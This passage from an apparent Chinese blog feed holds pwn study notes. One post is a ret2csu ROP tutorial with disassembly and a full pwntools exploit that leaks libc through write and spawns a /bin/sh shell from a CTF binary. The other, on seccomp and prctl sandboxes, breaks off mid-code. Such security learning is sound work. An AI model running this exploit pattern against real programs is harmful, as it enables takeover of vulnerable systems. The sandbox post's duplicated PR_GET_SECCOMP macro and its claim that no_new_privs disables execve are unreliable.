mov    DWORD PTR [rbp-0x1c],0x2</span><br><span class="line">    1163:       c7 45 e8 03 00 00 00    mov    DWORD PTR [rbp-0x18],0x3</span><br><span class="line">    116a:       c7 45 ec 04 00 00 00    mov    DWORD PTR [rbp-0x14],0x4</span><br><span class="line">    1171:       c7 45 f0 05 00 00 00    mov    DWORD PTR [rbp-0x10],0x5</span><br><span class="line">    1178:       c7 45 f4 06 00 00 00    mov    DWORD PTR [rbp-0xc],0x6</span><br><span class="line">    117f:       c7 45 f8 07 00 00 00    mov    DWORD PTR [rbp-0x8],0x7</span><br><span class="line">    1186:       c7 45 fc 08 00 00 00    mov    DWORD PTR [rbp-0x4],0x8</span><br><span class="line">    118d:       44 8b 4d f4             mov    r9d,DWORD PTR [rbp-0xc]</span><br><span class="line">    1191:       44 8b 45 f0             mov    r8d,DWORD PTR [rbp-0x10]</span><br><span class="line">    1195:       8b 4d ec                mov    ecx,DWORD PTR [rbp-0x14]</span><br><span class="line">    1198:       8b 55 e8                mov    edx,DWORD PTR [rbp-0x18]</span><br><span class="line">    119b:       8b 75 e4                mov    esi,DWORD PTR [rbp-0x1c]</span><br><span class="line">    119e:       8b 45 e0                mov    eax,DWORD PTR [rbp-0x20]</span><br><span class="line">    11a1:       8b 7d fc                mov    edi,DWORD PTR [rbp-0x4]</span><br><span class="line">    11a4:       57                      push   rdi</span><br><span class="line">    11a5:       8b 7d f8                mov    edi,DWORD PTR [rbp-0x8]</span><br><span class="line">    11a8:       57                      push   rdi</span><br><span class="line">    11a9:       89 c7                   mov    edi,eax</span><br><span class="line">    11ab:       e8 1e 00 00 00          call   11ce &lt;H&gt;</span><br><span class="line">    11b0:       48 83 c4 10             add    rsp,0x10</span><br><span class="line">    11b4:       89 c6                   mov    esi,eax</span><br><span class="line">    11b6:       48 8d 3d 47 0e 00 00    lea    rdi,[rip+0xe47]        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    11bd:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11c2:       e8 89 fe ff ff          call   1050 &lt;printf@plt&gt;</span><br><span class="line">    11c7:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line">    11cc:       c9                      leave</span><br><span class="line">    11cd:       c3                      ret</span><br><span class="line"></span><br><span class="line">00000000000011ce &lt;H&gt;:</span><br><span class="line">    11ce:       f3 0f 1e fa             endbr64</span><br><span class="line">    11d2:       55                      push   rbp</span><br><span class="line">    11d3:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    11d6:       89 7d fc                mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">    11d9:       89 75 f8                mov    DWORD PTR [rbp-0x8],esi</span><br><span class="line">    11dc:       89 55 f4                mov    DWORD PTR [rbp-0xc],edx</span><br><span class="line">    11df:       89 4d f0                mov    DWORD PTR [rbp-0x10],ecx</span><br><span class="line">    11e2:       44 89 45 ec             mov    DWORD PTR [rbp-0x14],r8d</span><br><span class="line">    11e6:       44 89 4d e8             mov    DWORD PTR [rbp-0x18],r9d</span><br><span class="line">    11ea:       8b 55 fc                mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">    11ed:       8b 45 f8                mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">    11f0:       01 c2                   add    edx,eax</span><br><span class="line">    11f2:       8b 45 f4                mov    eax,DWORD PTR [rbp-0xc]</span><br><span class="line">    11f5:       01 c2                   add    edx,eax</span><br><span class="line">    11f7:       8b 45 f0                mov    eax,DWORD PTR [rbp-0x10]</span><br><span class="line">    11fa:       01 c2                   add    edx,eax</span><br><span class="line">    11fc:       8b 45 ec                mov    eax,DWORD PTR [rbp-0x14]</span><br><span class="line">    11ff:       01 c2                   add    edx,eax</span><br><span class="line">    1201:       8b 45 e8                mov    eax,DWORD PTR [rbp-0x18]</span><br><span class="line">    1204:       01 c2                   add    edx,eax</span><br><span class="line">    1206:       8b 45 10                mov    eax,DWORD PTR [rbp+0x10]</span><br><span class="line">    1209:       01 c2                   add    edx,eax</span><br><span class="line">    120b:       8b 45 18                mov    eax,DWORD PTR [rbp+0x18]</span><br><span class="line">    120e:       01 d0                   add    eax,edx</span><br><span class="line">    1210:       5d                      pop    rbp</span><br><span class="line">    1211:       c3                      ret</span><br></pre></td></tr></table></figure><p>​很明显的就是前六个参数是寄存器传参，剩下两个就是栈传参。</p><h2 id="libc_csu_init函数基础"><a class="markdownIt-Anchor" href="#libc_csu_init函数基础">#</a>  <code>libc_csu_init</code>  函数基础：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220</span><br><span class="line">.text:0000000000001220 ; void _libc_csu_init(void)</span><br><span class="line">.text:0000000000001220                 public __libc_csu_init</span><br><span class="line">.text:0000000000001220 __libc_csu_init proc near               ; DATA XREF: _start+1A↑o</span><br><span class="line">.text:0000000000001220 ; __unwind &#123;</span><br><span class="line">.text:0000000000001220                 endbr64</span><br><span class="line">.text:0000000000001224                 push    r15</span><br><span class="line">.text:0000000000001226                 lea     r15, __frame_dummy_init_array_entry</span><br><span class="line">.text:000000000000122D                 push    r14</span><br><span class="line">.text:000000000000122F                 mov     r14, rdx</span><br><span class="line">.text:0000000000001232                 push    r13</span><br><span class="line">.text:0000000000001234                 mov     r13, rsi</span><br><span class="line">.text:0000000000001237                 push    r12</span><br><span class="line">.text:0000000000001239                 mov     r12d, edi</span><br><span class="line">.text:000000000000123C                 push    rbp</span><br><span class="line">.text:000000000000123D                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:0000000000001244                 push    rbx</span><br><span class="line">.text:0000000000001245                 sub     rbp, r15</span><br><span class="line">.text:0000000000001248                 sub     rsp, 8</span><br><span class="line">.text:000000000000124C                 call    _init_proc</span><br><span class="line">.text:0000000000001251                 sar     rbp, 3</span><br><span class="line">.text:0000000000001255                 jz      short loc_1276</span><br><span class="line">.text:0000000000001257                 xor     ebx, ebx</span><br><span class="line">.text:0000000000001259                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000001260</span><br><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br><span class="line">.text:0000000000001276</span><br><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br><span class="line">.text:0000000000001284 ; &#125; // starts at 1220</span><br></pre></td></tr></table></figure><p>​这里我们可以利用下面的几个点，上汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001276 loc_1276:                               ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:0000000000001276                 add     rsp, 8</span><br><span class="line">.text:000000000000127A                 pop     rbx</span><br><span class="line">.text:000000000000127B                 pop     rbp</span><br><span class="line">.text:000000000000127C                 pop     r12</span><br><span class="line">.text:000000000000127E                 pop     r13</span><br><span class="line">.text:0000000000001280                 pop     r14</span><br><span class="line">.text:0000000000001282                 pop     r15</span><br><span class="line">.text:0000000000001284                 retn</span><br></pre></td></tr></table></figure><p>​发现了这里可以修改个别寄存器的值，然后是这儿，可以修改传参用的那几个寄存器的值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001260 loc_1260:                               ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000001260                 mov     rdx, r14</span><br><span class="line">.text:0000000000001263                 mov     rsi, r13</span><br><span class="line">.text:0000000000001266                 mov     edi, r12d</span><br><span class="line">.text:0000000000001269                 call    ds:(__frame_dummy_init_array_entry - 3DB8h)[r15+rbx*8]</span><br><span class="line">.text:000000000000126D                 add     rbx, 1</span><br><span class="line">.text:0000000000001271                 cmp     rbp, rbx</span><br><span class="line">.text:0000000000001274                 jnz     short loc_1260</span><br></pre></td></tr></table></figure><p>​由此，我们可以通过控制 r13 等和传参用的寄存器相对应的来进行 ret2syscall 等操作。</p><h2 id="例子"><a class="markdownIt-Anchor" href="#例子">#</a> 例子：</h2><p>​先看看架构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ checksec pwn</span><br><span class="line">[*] &#x27;/home/g01den/Temp/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>​IDA 分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​然后看看 <code>__libc_csu_init</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0</span><br><span class="line">.text:00000000004005C0 ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; // starts at 4005C0</span><br></pre></td></tr></table></figure><p>​由下面这个点可以知道，可以控制的寄存器为 edi、rsi、rdx，另外， <code>call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]</code>  还使得可以调用 r12+rbx*8 的一个地址的函数，所以，这里可以利用 r12 来跳转到 write 函数来泄露 write 函数的地址，然后就可以通过 ret2libc 来获得 shell，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_addr = <span class="number">0x40061a</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mov_addr = <span class="number">0x400600</span></span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello, World\n&#x27;</span>)</span><br><span class="line">payload0 = <span class="string">&#x27;A&#x27;</span>*<span class="number">136</span> + p64(pop_addr) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(mov_addr) + <span class="string">&#x27;a &#x27;</span>*(<span class="number">0x8</span>+<span class="number">8</span>*<span class="number">6</span>) + p64(main_addr)</span><br><span class="line">p.sendline(payload0)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;write_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(write_start)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc_base=write_start-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))+libc_base</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;/bin/sh_addr_in_memory_is &quot;</span>+<span class="built_in">hex</span>(binsh)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x400623</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn学习笔记9-中级ropret2csu&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn学习笔记9-中级ropret2csu&quot;&gt;#&lt;/a&gt; pwn 学习笔记（9）- 中级 ROP–ret2csu&lt;/h1&gt;
&lt;h2 id=&quot;前置知</summary>
      
    
    
    
    <category term="Pwn手的自我修养" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记（8）-初识沙箱</title>
    <link href="http://blog.g01den.top/posts/9d5b1ce4.html"/>
    <id>http://blog.g01den.top/posts/9d5b1ce4.html</id>
    <published>2024-08-05T20:04:38.000Z</published>
    <updated>2024-08-05T20:13:34.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初识pwn沙箱"><a class="markdownIt-Anchor" href="#初识pwn沙箱">#</a> 初识 Pwn 沙箱</h1><p>​沙箱机制，英文 sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。</p><p>​安全计算模式 seccomp（Secure Computing Mode）在 Linux2.6.10 之后引入到 kernel 的特性，可用其实现一个沙箱环境。使用 seccomp 模式可以定义系统调用白名单和黑名单。seccomp 机制用于限制应用程序可以使用的系统调用，增加系统的安全性。</p><p>​在 ctf 中主要通过两种方式实现沙箱机制：</p><ul><li>prctl 系统调用；</li><li>seccomp 库函数；</li></ul><h2 id="1-prctl函数初探"><a class="markdownIt-Anchor" href="#1-prctl函数初探">#</a> 1、prctl 函数初探</h2><p>​prctl 是基本的进程管理函数，最原始的沙箱规则就是通过 prctl 函数来实现的，它可以决定有哪些系统调用函数可以被调用，哪些系统调用函数不能被调用。</p><p>​下面是 /linux/prctl.h 和 seccomp 相关的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get/set process seccomp mode */</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP      21</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> PR_GET_SECCOMP     22</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/userspace-api/no_new_privs.rst for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS    38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_GET_NO_NEW_PRIVS    39</span></span><br></pre></td></tr></table></figure><p>​<strong>prctl 函数原型</strong>：int prctl (int option,unsigned long argv2,unsigned long argv3,unsigned long argv4，unsigned long argv3)</p><p>在具体了解 prctl 函数之前，我们再了解这样一个概念：沙箱。沙箱 (Sandbox) 是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。seccomp 是内核中的一种安全机制，seccomp 可以在程序中禁用掉一些系统调用来达到保护系统安全的目的，seccomp 规则的设置，可以使用 prctl 函数和 seccomp 函数族。</p><p>​<strong>include/linux/prctl.h 里面存储着 prctl 的所有参数的宏定义，prctl 的五个参数中，其中第一个参数是你要做的事情，后面的参数都是对第一个参数的限定。</strong></p><p>​在第一个参数中，我们需要重点关注的参数有这两个：</p><ol><li>PR_SET_SECCOMP (22)：当第一个参数是 PR_SET_SECCOMP, 第二个参数 argv2 为 1 的时候，表示允许的系统调用有 read，write，exit 和 sigereturn；当 argv 等于 2 的时候，表示允许的系统调用由 argv3 指向 sock_fprog 结构体定义，该结构体成员指向的 sock_filter 可以定义过滤任意系统调用和系统调用参数。(细节见下图)</li><li>PR_SET_NO_NEWPRIVS (38):prctl (38,1,0,0,0) 表示禁用系统调用 execve () 函数，同时，这个选项可以通过 fork () 函数和 clone () 函数继承给子进程。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>        len;    <span class="comment">/* 指令个数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> *<span class="title">filter</span>;</span> <span class="comment">/*指向包含struct sock_filter的结构体数组指针*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>            <span class="comment">/* Filter block */</span></span><br><span class="line">    __u16 code;                 <span class="comment">/* Actual filter code,bpf指令码 */</span></span><br><span class="line">    __u8  jt;                   <span class="comment">/* Jump true */</span></span><br><span class="line">    __u8  jf;                   <span class="comment">/* Jump false */</span></span><br><span class="line">    __u32 k;                    <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//seccomp-data结构体记录当前正在进行bpf规则检查的系统调用信息</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> nr;<span class="comment">//系统调用号</span></span><br><span class="line">    __u32 arch;<span class="comment">//调用架构</span></span><br><span class="line">    __u64 instruction_pointer;<span class="comment">//CPU指令指针</span></span><br><span class="line">    __u64 argv[<span class="number">6</span>];<span class="comment">//寄存器的值，x86下是ebx，exc,edx,edi,ebp;x64下是rdi,rsi,rdx,r10,r8,r9</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-prctl函数详解"><a class="markdownIt-Anchor" href="#2-prctl函数详解">#</a> 2、prctl () 函数详解</h2><p>​ <code>prctl</code>  是一个系统调用，用于控制和修改进程的行为和属性。它可以在 Linux 系统上使用，提供了各种功能和选项来管理进程的不同方面。</p><p>​以下是 <code>prctl</code>  函数的基本原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">prctl</span><span class="params">(<span class="type">int</span> option, <span class="type">unsigned</span> <span class="type">long</span> arg2, <span class="type">unsigned</span> <span class="type">long</span> arg3, <span class="type">unsigned</span> <span class="type">long</span> arg4, <span class="type">unsigned</span> <span class="type">long</span> arg5)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>​prctl 函数接受不同的 option 选项和参数，用于执行不同的操作。下面是一些常用的 option 选项及其功能：</p><ul><li>PR_SET_NAME：设置进程名称。</li><li>PR_GET_NAME：获取进程名称。</li><li>PR_SET_PDEATHSIG：设置在父进程终止时发送给当前进程的信号。</li><li>PR_GET_PDEATHSIG：获取父进程终止时发送给当前进程的信号。</li><li>PR_SET_DUMPABLE：设置进程的可转储标志，影响核心转储。</li><li>PR_GET_DUMPABLE：获取进程的可转储标志。</li><li>PR_SET_SECCOMP：设置进程的安全计算模式。</li><li>PR_GET_SECCOMP：获取进程的安全计算模式。</li></ul></blockquote><p>​这些仅是一些常用的选项， <code>prctl</code>  还支持其他选项和功能。每个选项都有特定的参数，可以根据需要传递。具体的参数和行为取决于所选的选项。</p><p>​以下是一个简单的示例，展示了如何使用 <code>prctl</code>  函数设置进程名称：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> 